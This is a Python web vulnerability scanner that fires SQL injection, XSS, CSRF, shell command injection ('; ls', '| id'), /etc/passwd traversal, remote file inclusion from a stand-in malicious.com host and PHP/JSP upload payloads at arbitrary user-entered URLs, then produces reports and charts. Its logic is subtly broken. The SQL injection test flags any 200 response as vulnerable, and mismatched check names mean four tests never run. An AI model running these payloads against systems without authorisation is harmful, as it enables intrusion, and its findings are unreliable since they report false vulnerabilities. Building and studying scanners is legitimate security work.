import requests
from urllib.parse import urljoin
import threading
import logging
import csv
import json
from queue import Queue
import os
import html
import matplotlib.pyplot as plt
from concurrent.futures import ThreadPoolExecutor

# Configure logging (append mode)
logging.basicConfig(filename="vulnerability_scanner.log", level=logging.INFO, format="%(asctime)s - %(message)s", filemode="a")

# CSV, HTML, and JSON report setup (overwrite mode)
csv_file = "vulnerability_report.csv"
html_file = "vulnerability_report.html"
json_file = "vulnerability_report.json"
csv_headers = ["Vulnerability Type", "URL", "Payload", "Severity"]

# Queue for multi-threading
url_queue = Queue()
results = []

# Existing Payloads
sql_injection_payloads = ["' OR 1=1 --", "' OR 'a'='a", "' UNION SELECT NULL, NULL, NULL --"]
xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(\"XSS\")'>", "<svg onload='alert(\"XSS\")'></svg>"]
csrf_payloads = [
    "<img src='{url}/delete?item=1'/>",
    "<form action='{url}/delete' method='POST'><input type='hidden' name='item' value='1'><input type='submit'></form>",
    "<script>document.location='{url}/delete?item=1';</script>"
]
file_payloads = [
    ("file", ("malicious.php", "<?php echo 'Hello World'; ?>", "application/x-php")),
    ("file", ("malicious.jsp", "<% out.println('Hello World'); %>", "application/x-jsp"))
]

# Severity Levels
class Severity:
    LOW = 'Low'
    MEDIUM = 'Medium'
    HIGH = 'High'

# Class to store vulnerability details
class Vulnerability:
    def __init__(self, name, url, payload, severity):
        self.name = name
        self.url = url
        self.payload = payload
        self.severity = severity

    def __repr__(self):
        return f"Vulnerability(name={self.name}, url={self.url}, severity={self.severity})"

# Function to log and record results
def log_result(vuln_type, url, payload, severity):
    message = f"{vuln_type} found at {url} with payload: {payload} (Severity: {severity})"
    print(message)
    logging.info(message)
    results.append([vuln_type, url, payload, severity])

# Function to determine severity
def determine_severity(vulnerability_name):
    severity_mapping = {
        "SQL Injection": Severity.HIGH,
        "XSS": Severity.MEDIUM,
        "Clickjacking": Severity.LOW,
        "CSRF": Severity.MEDIUM,
        "Open Redirect": Severity.HIGH,
        "Path Traversal": Severity.HIGH,
    }
    return severity_mapping.get(vulnerability_name, Severity.LOW)  # Default to low severity if not found

# Function to test for SQL injection
def test_sql_injection(url):
    try:
        for payload in sql_injection_payloads:
            test_url = urljoin(url, f"?id={payload}")
            response = requests.get(test_url, timeout=5)
            
            # Checking for common SQL error indicators
            error_indicators = ["syntax error", "database", "sql", "query", "mysql"]
            if any(error in response.text.lower() for error in error_indicators) or response.status_code == 200:
                severity = determine_severity("SQL Injection")
                log_result("SQL Injection", test_url, payload, severity)
    except requests.exceptions.RequestException as e:
        logging.error(f"Error during SQL Injection testing: {e}")
    
def check_command_injection(url):
    payloads = ["; ls", "| ls", "& ls", "`ls`", "| id", "; id"]
    command_output_indicators = ["bin", "root", "usr", "id"]
    
    try:
        for payload in payloads:
            test_url = f"{url}?input={payload}"
            response = requests.get(test_url, timeout=5)
            
            if response.status_code == 200 and any(indicator in response.text for indicator in command_output_indicators):
                log_result("Command Injection", test_url, payload, determine_severity("Command Injection"))
            else:
                logging.info(f"No Command Injection detected on: {test_url}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error during Command Injection testing: {e}")

# Function to test for Directory Traversal
def check_directory_traversal(url):
    payloads = [
        "../../../etc/passwd", "../../../../etc/hosts", "../../../boot/grub/menu.lst", 
        "../../../../../../../../../../etc/passwd"
    ]
    try:
        for payload in payloads:
            test_url = f"{url}?file={payload}"
            response = requests.get(test_url, timeout=5)
            
            if response.status_code == 200 and "root:" in response.text:
                log_result("Directory Traversal", test_url, payload, determine_severity("Path Traversal"))
            else:
                logging.info(f"No Directory Traversal detected on: {test_url}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error during Directory Traversal testing: {e}")

# Function to test for HTTP Response Splitting
def check_http_response_splitting(url):
    payloads = [
        "\r\nSet-Cookie: test=1", "\r\nLocation: http://malicious.com"
    ]
    
    for payload in payloads:
        test_url = f"{url}?param={payload}"
        response = requests.get(test_url)
        if response.status_code == 200 and "Set-Cookie" in response.headers:
            print(f"HTTP Response Splitting vulnerability found: {test_url}")
        else:
            print(f"No HTTP Response Splitting: {test_url}")

# Function to test for Server Misconfigurations
def check_server_misconfigurations(url):
    methods_to_test = ["DELETE", "PUT", "TRACE"]
    
    for method in methods_to_test:
        response = requests.request(method, url)
        if response.status_code == 405:
            print(f"Server is configured to block {method} method.")
        else:
            print(f"Server misconfiguration found, allows {method} method: {url}")

# Function to test for File Inclusion
def check_file_inclusion(url):
    payloads = [
        "../../../etc/passwd", "http://malicious.com/malicious_file.txt"
    ]
    
    for payload in payloads:
        test_url = f"{url}?file={payload}"
        response = requests.get(test_url)
        if response.status_code == 200 and "root" in response.text:
            print(f"File Inclusion vulnerability found: {test_url}")
        else:
            print(f"No File Inclusion: {test_url}")

# Function to check for security headers
def check_security_headers(url):
    response = requests.get(url)
    headers = response.headers
    
    security_headers = [
        "X-Content-Type-Options", "X-XSS-Protection", "Strict-Transport-Security", "Content-Security-Policy"
    ]
    
    for header in security_headers:
        if header not in headers:
            print(f"Missing security header: {header}")
        else:
            print(f"Security header {header} found: {headers[header]}")

# Function to test for XSS
def test_xss(url):
    try:
        for payload in xss_payloads:
            test_url = f"{url}?search={payload}"
            logging.info(f"Testing XSS on: {test_url}")
            response = requests.get(test_url)
            logging.info(f"Response: {response.status_code} - {response.text[:500]}")  # First 500 chars of the body

            if payload in response.text or "<script>" in response.text:
                severity = determine_severity("XSS")
                log_result("XSS", test_url, payload, severity)
            else:
                logging.info(f"No XSS detected on: {test_url}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error during XSS testing: {e}")

# Function to test for CSRF vulnerability
def test_csrf(url):
    try:
        for payload in csrf_payloads:
            csrf_test_payload = payload.format(url=url)
            response = requests.post(url, data=csrf_test_payload)  # POST for CSRF
            if response.status_code == 200:
                severity = determine_severity("CSRF")
                log_result("CSRF", url, csrf_test_payload, severity)
    except requests.exceptions.RequestException as e:
        logging.error(f"Error during CSRF testing: {e}")

# Function to test for File Upload vulnerabilities
def test_file_upload(url):
    try:
        for payload in file_payloads:
            files = {
                payload[0]: (payload[1][0], payload[1][1], payload[1][2])
            }
            response = requests.post(url + "/upload", files=files)

            # Debugging: Log the response after the file upload attempt
            logging.info(f"File Upload test URL: {url}/upload - Response Code: {response.status_code}")
            logging.info(f"Response content: {response.text[:500]}")  # Log first 500 characters for inspection

            if response.status_code == 200 and "success" in response.text:  # Customize based on the actual response
                severity = determine_severity("File Upload")
                log_result("File Upload", url + "/upload", payload[1][0], severity)
    except requests.exceptions.RequestException as e:
        logging.error(f"Error during File Upload testing: {e}")

# Worker function for multi-threading
def worker():
    while not url_queue.empty():
        vuln_type, url = url_queue.get()
        try:
            if vuln_type == "SQL Injection":
                test_sql_injection(url)
            elif vuln_type == "XSS":
                test_xss(url)
            elif vuln_type == "CSRF":
                test_csrf(url)
            elif vuln_type == "File Upload":
                test_file_upload(url)
            elif vuln_type == "Security Headers":
                check_security_headers(url)
            elif vuln_type == "File Inclusion":
                check_file_inclusion(url)
            elif vuln_type == "Server Misconfigurations":
                check_server_misconfigurations(url)
            elif vuln_type == "HTTP Response Splitting":
                check_http_response_splitting(url)
            elif vuln_type == "Directory Traversal":
                check_directory_traversal(url)
            elif vuln_type == "Command Injection":
                check_command_injection(url)
        except Exception as e:
            logging.error(f"Error testing {vuln_type} on {url}: {e}")
        finally:
            url_queue.task_done()

# Function to start multi-threaded scanning
def run_with_thread_pool():
    # Create a thread pool to handle multiple URLs concurrently
    with ThreadPoolExecutor(max_workers=10) as executor:
        while not url_queue.empty():
            executor.submit(worker)


def generate_pie_chart(summary):
    # Extract labels and values from the summary dictionary
    labels = list(summary.keys())
    sizes = list(summary.values())
    
    # Generate the pie chart
    fig, ax = plt.subplots(figsize=(7, 7))
    ax.pie(sizes, labels=labels, autopct='%1.1f%%', startangle=140)
    ax.axis('equal')  # Equal aspect ratio ensures that pie chart is drawn as a circle.
    
    # Save the pie chart as an image
    pie_chart_path = "vulnerability_distribution.png"
    plt.savefig(pie_chart_path)
    plt.close()  # Close the plot to avoid displaying it
    
    return pie_chart_path

def generate_html_report(results, html_file="vulnerability_report.html"):
    # Check if there are any results to generate a report
    if not results:
        logging.info("No vulnerabilities found, skipping HTML report generation.")
        return

    # Summarizing the results
    summary = {}
    for result in results:
        vuln_type = result[0]
        summary[vuln_type] = summary.get(vuln_type, 0) + 1

    # Creating the HTML report with added CSS for styling
    with open(html_file, "w") as file:
        file.write("""<html><head><title>Vulnerability Scan Report</title>
        <style>
            body {font-family: Arial, sans-serif; background-color: #f4f4f9; color: #333;}
            h1, h2 {color: #007bff;}
            table {width: 80%; margin: 20px auto; border-collapse: collapse;}
            th, td {padding: 10px; text-align: left; border-bottom: 1px solid #ddd;}
            th {background-color: #007bff; color: white;}
            tr:hover {background-color: #f1f1f1;}
            img {max-width: 100%; height: auto;}
        </style></head><body><h1>Vulnerability Scan Report</h1><h2>Summary</h2><table><tr><th>Vulnerability Type</th><th>Count</th></tr>""")

        # Creating summary table
        for vuln_type, count in summary.items():
            file.write(f"<tr><td>{html.escape(vuln_type)}</td><td>{count}</td></tr>")

        file.write("</table><h2>Detailed Results</h2><table><tr><th>Vulnerability Type</th><th>URL</th><th>Payload</th><th>Severity</th></tr>")

        # Creating detailed results table
        for result in results:
            vuln_type, url, payload, severity = result
            file.write(f"<tr><td>{html.escape(vuln_type)}</td><td>{html.escape(url)}</td><td>{html.escape(payload)}</td><td>{html.escape(severity)}</td></tr>")

        file.write("</table>")

        # Generate and Embed Pie Chart Image
        pie_chart_path = generate_pie_chart(summary)
        file.write('<h2>Vulnerability Distribution (Pie Chart)</h2><img src="vulnerability_distribution.png" alt="Vulnerability Distribution Pie Chart">')

        # Generate and Embed Bar Chart Image
        file.write('<h2>Vulnerability Distribution (Bar Chart)</h2>')
        plt.bar(summary.keys(), summary.values(), color='skyblue')
        plt.xlabel('Vulnerability Type')
        plt.ylabel('Count')
        plt.title('Vulnerability Distribution (Bar Chart)')
        bar_chart_path = "vulnerability_bar_chart.png"
        plt.savefig(bar_chart_path)  # Save the bar chart
        plt.close()  # Close the plot to avoid displaying it
        file.write(f'<img src="{bar_chart_path}" alt="Vulnerability Distribution Bar Chart">')
        file.write("</table></body></html>")

    logging.info(f"HTML report generated and saved to {html_file}")

def generate_json_report():
    # Check if there are any results to generate a report
    if not results:
        logging.info("No vulnerabilities found, skipping JSON report generation.")
        return

    # Transforming results into a list of dictionaries for better JSON format
    json_results = [{"Vulnerability Type": result[0], "URL": result[1], "Payload": result[2], "Severity": result[3]} for result in results]

    # Creating JSON report
    with open(json_file, "w") as file:
        json.dump(json_results, file, indent=4)

    logging.info(f"JSON report generated and saved to {json_file}")

def generate_visualizations():
    # Summarizing the vulnerabilities for visualization
    vulnerability_count = {}
    for result in results:
        vuln_type = result[0]
        vulnerability_count[vuln_type] = vulnerability_count.get(vuln_type, 0) + 1

    # Creating a pie chart
    labels = list(vulnerability_count.keys())
    sizes = list(vulnerability_count.values())

    plt.pie(sizes, labels=labels, autopct='%1.1f%%', startangle=140)
    plt.axis('equal')  # Equal aspect ratio ensures that pie is drawn as a circle.
    plt.title("Vulnerability Distribution")
    plt.savefig("vulnerability_distribution.png")  # Save pie chart as image
    plt.close()  # Close the plot to avoid displaying it in an interactive session

    logging.info("Visualizations generated and saved as vulnerability_distribution.png")

# Main function to start scanning URLs
def start_scanning(urls):
    # Add URLs to queue for scanning
    for url in urls:
        url_queue.put(("SQL Injection", url))
        url_queue.put(("XSS", url))
        url_queue.put(("CSRF", url))
        url_queue.put(("File Upload", url))
        url_queue.put(("Command Injection", url))
        url_queue.put(("Directory Traversal", url))
        url_queue.put(("Http Response splitting ", url))
        url_queue.put(("Security headers ", url))
        url_queue.put(("Server Misconfiguration ", url))
        url_queue.put(("File Inclusion ", url))

    # Start multiple threads for parallel processing
    threads = []
    for _ in range(5):  # Creating 5 threads for parallelism
        thread = threading.Thread(target=worker)
        threads.append(thread)
        thread.start()

    # Join all threads to ensure the scanning is complete before proceeding
    for thread in threads:
        thread.join()

    # Generate Reports and Visualizations
    generate_html_report(results)
    generate_json_report()
    generate_visualizations()

def get_urls_from_user():
    urls = []
    print("Enter URLs to scan (type 'done' to finish):")
    while True:
        url = input("Enter URL: ")
        if url.lower() == 'done':
            break
        urls.append(url)
    return urls

# Get URLs from the user
urls_to_scan = get_urls_from_user()

# Start the scanning process with the URLs provided by the user
start_scanning(urls_to_scan)

